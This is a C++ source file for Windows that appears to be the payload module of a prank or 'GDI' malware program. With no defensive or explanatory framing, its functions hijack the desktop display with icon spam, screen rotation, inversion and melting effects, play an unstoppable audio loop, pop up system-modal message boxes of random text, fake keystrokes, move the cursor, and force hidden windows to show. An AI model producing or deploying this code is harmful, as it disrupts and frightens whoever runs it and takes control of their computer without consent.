#include "MU.h"
#include <thread>
#include <mmsystem.h>
#include <chrono>
#include <atomic>
#include <string>

#pragma comment(lib, "Winmm.lib")

HCRYPTPROV prov;

int Random() {
    if (prov == NULL) {
        if (!CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT)) {
            ExitProcess(1);
        }
    }
    int out;
    CryptGenRandom(prov, sizeof(out), (BYTE*)(&out));
    return out & 0x7fffffff;
}

int64_t getTimeMS() {
    return std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::steady_clock::now().time_since_epoch()).count();
}

int AudioPayload(void)
{
    int number = getTimeMS();
    while (number <= 1000)
        number = number / 10;
    while (1) {
        HWAVEOUT hwo = 0;
        WAVEFORMATEX wfx = {
            WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0
        };
        waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
        char buffer[8000 * 100];
        for (DWORD t = 0; t < sizeof(buffer); t++)
            buffer[t] = static_cast<char>(
                (t - (number >> 4 & t >> number) & t >> 4) - 1
                +
                (number + t / (1 + (t >> 9 & number >> 8))) & 128
                +
                (((t & t >> 2) - (t >> 3 & t)) & ((t & t >> 13)
                    - (t >> 13))) ^ (t >> 8 & t)
                *
                (((t & t >> 2) - (t >> 3 & t)) & ((t & t >> 13)
                    - (t >> 13))) ^ (t >> 8 & t)
                );
        WAVEHDR hdr = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
        waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
        waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
        waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
        waveOutClose(hwo);
        Sleep(-1);
    }
}


void DrawIconsT() {
    const int scrw = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    const int scrh = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    int ix = GetSystemMetrics(SM_CXICON) / 2;
    int iy = GetSystemMetrics(SM_CYICON) / 2;
    HWND hwnd = GetDesktopWindow();
    HDC hdc = GetWindowDC(hwnd);
    POINT cursor;
    while (true) {
        GetCursorPos(&cursor);
        DrawIcon(hdc, cursor.x, cursor.y, LoadIcon(NULL, IDI_ERROR));
        DrawIcon(hdc, Random() % scrw, Random() % scrh, LoadIcon(NULL, IDI_WARNING));
        DrawIcon(hdc, Random() % scrw, Random() % scrh, LoadIcon(NULL, IDI_APPLICATION));
        DrawIcon(hdc, Random() % scrw, Random() % scrh, LoadIcon(NULL, IDI_ASTERISK));
        DrawIcon(hdc, Random() % scrw, Random() % scrh, LoadIcon(NULL, IDI_EXCLAMATION));
        ReleaseDC(hwnd, hdc);
    };
}


void PartialRotate(std::atomic<bool>& quit_flag) {
    HDC desktopDC = GetDC(0);
    const int scrx = GetSystemMetrics(SM_XVIRTUALSCREEN);
    const int scry = GetSystemMetrics(SM_YVIRTUALSCREEN);
    const int scrw = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    const int scrh = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    HDC screenshotDC = CreateCompatibleDC(desktopDC);
    HBITMAP screenshotBmp = CreateCompatibleBitmap(desktopDC, scrw, scrh);
    SelectObject(screenshotDC, screenshotBmp);
    int i = 0;
    while (!quit_flag) {
        desktopDC = GetDC(0);
        BitBlt(screenshotDC, scrx, scry, scrw, scrh, desktopDC, 0, 0, SRCCOPY);
        int rx = Random() % 1920;
        int ry = Random() % 1080;
        SetCursorPos(rx, ry);
        rx = Random() % 1920;
        ry = Random() % 1080;
        for (float angle = 3.1415926535 * 1.8; angle < 2 * 3.1415926535; angle += 3.1415926535 / 30) {
            float sinx = sinf(angle);
            float cosy = cosf(angle);     
            for (int d = 0; d < 40 * 50; d += 50) {
                int _x = sinx * (d - 1) + rx;
                int _y = cosy * (d - 1) + ry;
                int targetX = sinx * d + rx;
                int targetY = cosy * d + ry;
                BitBlt(screenshotDC, targetX, targetY, 50, 50, screenshotDC, _x, _y, SRCCOPY);
                int x2 = (cosf(angle) * (scrx - 400) - sinf(angle) * (scry - 400) + scrx);
                int y2 = (sinf(angle) * (scrx - 400) - cosf(angle) * (scry - 400) + scrx);
                BitBlt(screenshotDC, 500, 0, x2, y2, screenshotDC, _x, _y, SRCCOPY);
                BitBlt(screenshotDC, 1000, 0, x2, y2, screenshotDC, _x, _y, SRCCOPY);
                BitBlt(screenshotDC, 1500, 1000, x2, y2, screenshotDC, _x, _y, SRCCOPY);
                BitBlt(screenshotDC, 2000, 1000, x2, y2, screenshotDC, _x, _y, SRCCOPY);
            }
            i++;
            if (i % 25 == 0)
                PatBlt(desktopDC, scrx, scry, scrw, scrh, DSTINVERT);
            StretchBlt(desktopDC, 0, 0, scrw, scrh, screenshotDC, scrx + 10, scry + 10, scrw, scrh, SRCCOPY);
            StretchBlt(desktopDC, 0, 0, scrw, scrh, screenshotDC, scrx - 15, scry - 15, scrw, scrh, SRCCOPY);
        }   
        Sleep(10);
    }
}

#define randx Random() % 1920
#define randy Random() % 1080

void Melt(std::atomic<bool> &quit_flag) 
{
    HDC desktop = GetDC(NULL);
    int xs = GetSystemMetrics(SM_CXSCREEN);
    int ys = GetSystemMetrics(SM_CYSCREEN);
    int sal1 = 0, sal2 = 0, sal3 = 0;
    while (!quit_flag) {
        desktop = GetDC(NULL);
        BitBlt(desktop, 1, -1, xs, ys, desktop, sal1, sal2, SRCPAINT);
        sal3++;
        if (sal3 % 30 == 0)
        {
            if (sal1 % 5 == 0)
                sal1++;
            if (sal1 % 5 == 0)
                sal2--;
        }
        Sleep(100);
    }
}


void GotoDesktop(void) {
    INPUT ip;
    ip.type = INPUT_KEYBOARD;
    ip.ki.wScan = 0;
    ip.ki.time = 0;
    ip.ki.dwExtraInfo = 0;
    ip.ki.wVk = VK_LWIN;
    ip.ki.dwFlags = 0;
    SendInput(1, &ip, sizeof(INPUT));
    ip.ki.wVk = 0x44;
    SendInput(1, &ip, sizeof(INPUT));
    ip.ki.wVk = 0x44;
    ip.ki.dwFlags = KEYEVENTF_KEYUP;
    SendInput(1, &ip, sizeof(INPUT));
    ip.ki.wVk = VK_LWIN;
    SendInput(1, &ip, sizeof(INPUT));
}


void Rainbow(std::atomic < bool >& quit_flag) {
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    while (!quit_flag) {
        COLORREF ColorRush = RGB(Random() % 255, Random() % 255, Random() % 255);
        HBRUSH hBrush = CreateSolidBrush(RGB(Random() % 255, Random() % 255, Random() % 255));
        SelectObject(desk, hBrush);
        PatBlt(desk, 0, 0, sw, sh, PATINVERT);
        Sleep(5000);
    }
}

std::string gen_random() {
    static
        const char x[] =
        "random string. zzddnbghju9839jiomnkw:(FD {}[][][]";
    int len = 30;
    std::string STR;
    STR.reserve(len);
    for (int i = 0; i < len; ++i) {
        STR += x[Random() % (sizeof(x) - 1)];
    }
    return STR;
}

LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);

int x = Random() % (500);
int y = Random() % (700);

LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HCBT_CREATEWND) {
        CREATESTRUCT* pcs = ((CBT_CREATEWND*)lParam)->lpcs;

        if ((pcs->style & WS_DLGFRAME) || (pcs->style & WS_POPUP)) {
            HWND hwnd = (HWND)wParam;

            pcs->x = x;
            pcs->y = y;
        }

    }

    return CallNextHookEx(0, nCode, wParam, lParam);
}

DWORD WINAPI ripMessageThread(LPVOID parameter) {
    HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
    std::string lol = gen_random();
    std::string lol2 = gen_random();
    MessageBoxA(NULL, (LPCSTR)lol.c_str(), "(!)", MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
    UnhookWindowsHookEx(hook);
    return 0;
}



int i;

VOID ci(int x, int y, int w, int h)
{
    HDC hdc = GetDC(0);
    HRGN hrgn;
    if (i % 2 == 0 )
         hrgn = CreateRectRgn(x, y, w + x, h + y);
    else hrgn = CreateEllipticRgn(x, y, w + x, h + y);
    SelectClipRgn(hdc, hrgn);
    BitBlt(hdc, x, y, w, h, hdc, x, y, NOTSRCCOPY);
    DeleteObject(hrgn);
    ReleaseDC(NULL, hdc);
    i++;

}


VOID showwindow(WCHAR* target) {

    EnableWindow(FindWindowW(target, 0), TRUE);
    ShowWindow(FindWindowW(target, 0), TRUE);
}


BOOL CALLBACK EnumWindowsCallback(HWND hwnd, LPARAM lparam) {
    INT size = GetWindowTextLength(hwnd);
    WCHAR* buf = new wchar_t[size + 1];  
    GetWindowTextW(hwnd, buf, size + 1);

    WCHAR* title(buf);
    showwindow(title);

    return TRUE;

}

VOID ShowAllWindows() {
    EnumWindows(EnumWindowsCallback, 0); 
}


VOID startGDIPayload
    (no_args) 
{
    std::thread DrawIconThread(DrawIconsT);
#ifdef RELEASE
    ShowAllWindows();
#endif
    Sleep(1000);
    GotoDesktop();
    HDC mHDC;
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    for (int mI = 0; mI < 50; mI++) {
        mHDC = GetDC(0);
        BitBlt(
            mHDC, Random() % 2, Random() % 2, w, h, mHDC,
            Random() % 2, Random() % 2, SRCAND);
        Sleep(100);
        ci(w, h, w, h);
    }
    Sleep(1000);
    std::atomic_bool rotate_quit_flag(false);
    std::atomic_bool rainbow_quit_flag(false);
    std::atomic_bool melt_quit_flag(false);
    GotoDesktop();
    std::thread PartialRotateThread(PartialRotate, std::ref(rotate_quit_flag));
    Sleep(1000);
    std::thread RainbowThread(Rainbow, std::ref(rainbow_quit_flag));
    Sleep(1000);
    std::thread AudioThread(AudioPayload);
    Sleep(1000);
    Sleep(10000);
    rotate_quit_flag = true;
    for (int i = 0; i < 10; i++) {
        CreateThread(NULL, 4096, &ripMessageThread, NULL, NULL, NULL);
        Sleep(50);
        x = Random() % (1920);
        y = Random() % (1080);
    }
    Sleep(10000+15000);
    std::thread MeltThread(Melt, std::ref(melt_quit_flag));
    rainbow_quit_flag = true;
    Sleep(10000);
    melt_quit_flag = true;

    Sleep(1000);  

    /* Stupid debug error lmfao */

    DrawIconThread.join();
    MeltThread.join();
    AudioThread.join();
    RainbowThread.join();
    PartialRotateThread.join();
}
